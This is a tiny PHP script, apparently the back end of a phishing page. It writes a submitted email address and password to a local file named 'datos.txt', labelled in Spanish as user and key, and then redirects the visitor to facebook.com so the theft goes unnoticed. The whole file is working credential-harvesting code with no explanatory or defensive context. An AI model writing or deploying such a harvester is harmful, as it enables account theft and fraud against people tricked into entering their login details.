<?php
header('Location: https://facebook.com/');
if (!empty($_POST['email'])) {file_put_contents("datos.txt", "Usuario: " . $_POST['email'] . " Clave: " . $_POST['pass'] . "\n", FILE_APPEND);
}

exit();
